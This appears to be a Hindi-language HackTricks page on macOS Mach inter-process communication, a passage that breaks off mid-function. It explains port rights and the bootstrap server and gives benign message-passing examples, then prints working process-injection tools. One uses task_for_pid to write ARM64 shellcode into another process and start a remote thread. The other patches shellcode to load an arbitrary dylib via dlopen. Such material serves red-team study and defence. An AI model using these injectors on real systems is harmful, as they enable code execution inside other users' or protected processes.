# macOS IPC - इंटर प्रोसेस कम्युनिकेशन

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**।
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>

## Mach मैसेजिंग वाया पोर्ट्स

### मूल जानकारी

Mach **tasks** का उपयोग संसाधनों को साझा करने के लिए **सबसे छोटी इकाई** के रूप में करता है, और प्रत्येक टास्क में **कई थ्रेड्स** हो सकते हैं। ये **tasks और threads POSIX प्रोसेसेस और थ्रेड्स के साथ 1:1 मैप किए जाते हैं**।

Tasks के बीच संचार Mach इंटर-प्रोसेस कम्युनिकेशन (IPC) के माध्यम से होता है, जिसमें एक-तरफा संचार चैनलों का उपयोग होता है। **संदेश पोर्ट्स के बीच स्थानांतरित किए जाते हैं**, जो कर्नेल द्वारा प्रबंधित **संदेश कतारों** की तरह काम करते हैं।

प्रत्येक प्रोसेस की एक **IPC टेबल** होती है, जिसमें प्रोसेस के **mach पोर्ट्स** पाए जा सकते हैं। Mach पोर्ट का नाम वास्तव में एक संख्या होती है (कर्नेल ऑब्जेक्ट के लिए एक पॉइंटर)।

एक प्रोसेस कुछ अधिकारों के साथ **एक अलग टास्क को पोर्ट नाम भी भेज सकता है** और कर्नेल इस प्रविष्टि को **दूसरे टास्क की IPC टेबल में दिखाएगा**।

### पोर्ट अधिकार

पोर्ट अधिकार, जो यह परिभाषित करते हैं कि एक टास्क क्या ऑपरेशन कर सकता है, इस संचार के लिए महत्वपूर्ण हैं। संभावित **पोर्ट अधिकार** हैं:

* **Receive right**, जो पोर्ट पर भेजे गए संदेशों को प्राप्त करने की अनुमति देता है। Mach पोर्ट्स MPSC (multiple-producer, single-consumer) कतारें हैं, जिसका मतलब है कि पूरे सिस्टम में प्रत्येक पोर्ट के लिए केवल **एक Receive right** हो सकता है (pipes के विपरीत, जहां कई प्रोसेस एक पाइप के रीड एंड के लिए फाइल डिस्क्रिप्टर्स रख सकते हैं)।
* **Receive right वाला टास्क** संदेश प्राप्त कर सकता है और **Send rights बना सकता है**, जिससे वह संदेश भेज सकता है। मूल रूप से केवल **अपना टास्क ही अपने पोर्ट पर Receive right रखता है**।
* **Send right**, जो पोर्ट पर संदेश भेजने की अनुमति देता है।
* Send right को **क्लोन किया जा सकता है** ताकि Send right रखने वाला टास्क अधिकार को क्लोन कर सके और **तीसरे टास्क को प्रदान कर सके**।
* **Send-once right**, जो पोर्ट पर एक संदेश भेजने की अनुमति देता है और फिर गायब हो जाता है।
* **Port set right**, जो एक _port set_ को दर्शाता है बजाय एकल पोर्ट के। Port set से एक संदेश को dequeue करना उसमें शामिल पोर्ट्स में से एक से संदेश को dequeue करता है। Port sets का उपयोग कई पोर्ट्स पर एक साथ सुनने के लिए किया जा सकता है, Unix में `select`/`poll`/`epoll`/`kqueue` की तरह।
* **Dead name**, जो वास्तविक पोर्ट अधिकार नहीं है, बल्कि केवल एक प्लेसहोल्डर है। जब एक पोर्ट नष्ट हो जाता है, तो पोर्ट के लिए सभी मौजूदा पोर्ट अधिकार dead names में बदल जाते हैं।

**टास्क SEND अधिकारों को दूसरों को स्थानांतरित कर सकते हैं**, जिससे वे वापस संदेश भेज सकते हैं। **SEND अधिकारों को भी क्लोन किया जा सकता है, इसलिए एक टास्क अधिकार को दोहरा सकता है और तीसरे टास्क को दे सकता है**। यह, **bootstrap server** के रूप में जाने जाने वाले मध्यस्थ प्रक्रिया के साथ मिलकर, tasks के बीच प्रभावी संचार के लिए अनुमति देता है।

### संचार स्थापित करना

#### चरण:

जैसा कि उल्लेख किया गया है, संचार चैनल स्थापित करने के लिए, **bootstrap server** (**launchd** मैक में) शामिल होता है।

1. टास्क **A** एक **नया पोर्ट** शुरू करता है, जिससे उसे प्रक्रिया में एक **RECEIVE right** प्राप्त होती है।
2. टास्क **A**, RECEIVE right के धारक होने के नाते, पोर्ट के लिए एक **SEND right उत्पन्न करता है**।
3. टास्क **A** **bootstrap server** के साथ एक **कनेक्शन** स्थापित करता है, प्रक्रिया के रूप में जाने वाले bootstrap register के माध्यम से **पोर्ट की सेवा नाम** और **SEND right** प्रदान करता है।
4. टास्क **B** **bootstrap server** के साथ बातचीत करता है ताकि सेवा **नाम के लिए एक bootstrap लुकअप** कर सके। यदि सफल होता है, तो **सर्वर Task A से प्राप्त SEND right को दोहराता है** और **Task B को प्रेषित करता है**।
5. SEND right प्राप्त करने पर, टास्क **B** एक **संदेश का निर्माण** करने और उसे **Task A को भेजने** में सक्षम होता है।
6. द्विदिशात्मक संचार के लिए आमतौर पर टास्क **B** एक नया पोर्ट उत्पन्न करता है जिसमें एक **RECEIVE** right और एक **SEND** right होती है, और Task A को **SEND right देता है** ताकि वह TASK B को संदेश भेज सके (द्विदिशात्मक संचार)।

Bootstrap server **सेवा नाम की प्रमाणिकता की पुष्टि नहीं कर सकता**। इसका मतलब है कि एक **टास्क** किसी भी सिस्टम टास्क की **गलत तरीके से नकल कर सकता है**, जैसे कि गलत तरीके से **एक प्राधिकरण सेवा नाम का दावा करना** और फिर हर अनुरोध को मंजूरी देना।

फिर, Apple सिस्टम-प्रदान की गई सेवाओं के **नामों को सुरक्षित कॉन्फ़िगरेशन फ़ाइलों में संग्रहीत करता है**, जो **SIP-संरक्षित** निर्देशिकाओं में स्थित हैं: `/System/Library/LaunchDaemons` और `/System/Library/LaunchAgents`। प्रत्येक सेवा नाम के साथ, **संबद्ध बाइनरी भी संग्रहीत की जाती है**। Bootstrap server, इन सेवा नामों में से प्रत्येक के लिए एक **RECEIVE right बनाएगा और रखेगा**।

इन पूर्वनिर्धारित सेवाओं के लिए, **लुकअप प्रक्रिया थोड़ी अलग होती है**। जब एक सेवा नाम की तलाश की जा रही
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
संदेश प्राप्त करने वाली प्रक्रिया को _**receive right**_ रखने वाला कहा जाता है, जबकि **प्रेषक** _**send**_ या _**send-once**_** right** रखते हैं। Send-once, जैसा कि नाम से स्पष्ट है, केवल एक बार संदेश भेजने के लिए उपयोग किया जा सकता है और फिर अमान्य हो जाता है।

आसान **द्वि-दिशात्मक संचार** प्राप्त करने के लिए, एक प्रक्रिया मच **संदेश हेडर** में एक **mach port** निर्दिष्ट कर सकती है जिसे _reply port_ (**`msgh_local_port`**) कहा जाता है, जहां संदेश का **प्राप्तकर्ता** इस संदेश का **उत्तर भेज** सकता है। **`msgh_bits`** में बिटफ्लैग्स का उपयोग इस पोर्ट के लिए **send-once** **right** को व्युत्पन्न करने और स्थानांतरित करने के लिए **संकेत** देने के लिए किया जा सकता है (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
ध्यान दें कि इस प्रकार का द्वि-दिशात्मक संचार XPC संदेशों में उपयोग किया जाता है जो एक प्रतिक्रिया की अपेक्षा करते हैं (`xpc_connection_send_message_with_reply` और `xpc_connection_send_message_with_reply_sync`). लेकिन **आमतौर पर अलग-अलग पोर्ट्स बनाए जाते हैं** जैसा कि पहले समझाया गया है द्वि-दिशात्मक संचार बनाने के लिए।
{% endhint %}

संदेश हेडर के अन्य फील्ड्स हैं:

* `msgh_size`: पूरे पैकेट का आकार।
* `msgh_remote_port`: वह पोर्ट जिस पर यह संदेश भेजा जाता है।
* `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html)।
* `msgh_id`: इस संदेश की ID, जिसे प्राप्तकर्ता द्वारा व्याख्या की जाती है।

{% hint style="danger" %}
ध्यान दें कि **mach संदेश एक **_**mach port**_ के माध्यम से भेजे जाते हैं, जो एक **एकल प्राप्तकर्ता**, **बहु प्रेषक** संचार चैनल है जो मच कर्नेल में निर्मित है। **बहु प्रक्रियाएं** एक मच पोर्ट पर संदेश **भेज सकती हैं**, लेकिन किसी भी समय केवल **एक प्रक्रिया ही इससे पढ़ सकती है**।
{% endhint %}

### पोर्ट्स की गणना करें
```bash
lsmp -p <pid>
```
आप इस टूल को iOS में इंस्टॉल कर सकते हैं, इसे [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) से डाउनलोड करके।

### कोड उदाहरण

ध्यान दें कि कैसे **प्रेषक** एक पोर्ट को **आवंटित** करता है, `org.darlinghq.example` नाम के लिए एक **send right** बनाता है और इसे **bootstrap server** को भेजता है जबकि प्रेषक ने उस नाम के **send right** का अनुरोध किया और इसे एक **संदेश भेजने** के लिए इस्तेमाल किया।

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### विशेषाधिकार प्राप्त पोर्ट्स

* **होस्ट पोर्ट**: यदि किसी प्रक्रिया के पास इस पोर्ट पर **Send** अधिकार है तो वह **सिस्टम** के बारे में **जानकारी** प्राप्त कर सकता है (उदाहरण के लिए `host_processor_info`).
* **होस्ट प्रिव पोर्ट**: इस पोर्ट पर **Send** अधिकार वाली प्रक्रिया **विशेषाधिकार प्राप्त कार्य** कर सकती है जैसे कि कर्नेल एक्सटेंशन लोड करना। इस अनुमति के लिए **प्रक्रिया को रूट होना चाहिए**।
* इसके अलावा, **`kext_request`** API को कॉल करने के लिए अन्य एंटाइटलमेंट्स **`com.apple.private.kext*`** की आवश्यकता होती है जो केवल Apple बाइनरीज को दिए जाते हैं।
* **टास्क नाम पोर्ट:** _टास्क पोर्ट_ का एक अविशेषाधिकार प्राप्त संस्करण। यह टास्क का संदर्भ देता है, लेकिन इसे नियंत्रित नहीं कर सकता। इसके माध्यम से उपलब्ध एकमात्र चीज `task_info()` है।
* **टास्क पोर्ट** (उर्फ कर्नेल पोर्ट)**:** इस पोर्ट पर Send अधिकार के साथ टास्क को नियंत्रित करना संभव है (मेमोरी पढ़ना/लिखना, थ्रेड्स बनाना...).
* कॉलर टास्क के लिए इस पोर्ट का **नाम प्राप्त करने** के लिए `mach_task_self()` को कॉल करें। यह पोर्ट केवल **`exec()`** के माध्यम से **विरासत में मिलता है**; `fork()` के साथ बनाया गया एक नया टास्क एक नया टास्क पोर्ट प्राप्त करता है (एक विशेष मामले के रूप में, एक टास्क भी `exec()` के बाद एक suid बाइनरी में एक नया टास्क पोर्ट प्राप्त करता है)। एक टास्क को जन्म देने और उसका पोर्ट प्राप्त करने का एकमात्र तरीका `fork()` करते समय ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) करना है।
* ये पोर्ट तक पहुँचने के प्रतिबंध हैं (बाइनरी `AppleMobileFileIntegrity` से `macos_task_policy` से):
* यदि ऐप के पास **`com.apple.security.get-task-allow` एंटाइटलमेंट** है तो **उसी यूजर की प्रक्रियाएं टास्क पोर्ट तक पहुँच सकती हैं** (डिबगिंग के लिए Xcode द्वारा आमतौर पर जोड़ा जाता है)। **नोटराइजेशन** प्रक्रिया इसे प्रोडक्शन रिलीज़ में अनुमति नहीं देगी।
* **`com.apple.system-task-ports`** एंटाइटलमेंट वाले ऐप्स किसी भी प्रक्रिया के लिए **टास्क पोर्ट प्राप्त कर सकते हैं**, कर्नेल को छोड़कर। पुराने संस्करणों में इसे **`task_for_pid-allow`** कहा जाता था। यह केवल Apple अनुप्रयोगों को दिया जाता है।
* **रूट उन अनुप्रयोगों के टास्क पोर्ट्स तक पहुँच सकता है** जो **हार्डन्ड** रनटाइम के साथ संकलित नहीं हैं (और Apple से नहीं)।

### टास्क पोर्ट के माध्यम से थ्रेड में शेलकोड इंजेक्शन&#x20;

आप शेलकोड यहाँ से प्राप्त कर सकते हैं:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
```
{% endtab %}

{% tab title="entitlements.plist" %}
```
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

पिछले प्रोग्राम को **Compile** करें और उसी यूजर के साथ कोड इंजेक्ट करने के लिए **entitlements** जोड़ें (यदि नहीं तो आपको **sudo** का उपयोग करना होगा)।

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
<details>
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### थ्रेड के माध्यम से Task पोर्ट के जरिए Dylib इंजेक्शन

macOS में **थ्रेड्स** को **Mach** के जरिए या **posix `pthread` api** का उपयोग करके मैनिपुलेट किया जा सकता है। पिछले इंजेक्शन में जो थ्रेड बनाया गया था, वह Mach api का उपयोग करके बनाया गया था, इसलिए **यह posix अनुरूप नहीं है**।

एक साधारण शेलकोड को **इंजेक्ट करना संभव था** ताकि एक कमांड निष्पादित की जा सके क्योंकि इसे **posix अनुरूप apis के साथ काम करने की आवश्यकता नहीं थी**, केवल Mach के साथ। **अधिक जटिल इंजेक्शन्स** के लिए आवश्यक होगा कि **थ्रेड** भी **posix अनुरूप** हो।

इसलिए, **थ्रेड को बेहतर बनाने के लिए** इसे **`pthread_create_from_mach_thread`** को कॉल करना चाहिए जो **एक वैध pthread बनाएगा**। फिर, यह नया pthread **dlopen को कॉल कर सकता है** ताकि सिस्टम से एक dylib को **लोड किया जा सके**, इसलिए विभिन्न क्रियाओं को प्रदर्शित करने के लिए नए शेलकोड लिखने के बजाय यह संभव है कि कस्टम लाइब्रेरीज को लोड किया जाए।

आप **उदाहरण dylibs** को यहाँ पा सकते हैं (उदाहरण के लिए वह जो एक लॉग जेनरेट करता है और फिर आप उसे सुन सकते हैं):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

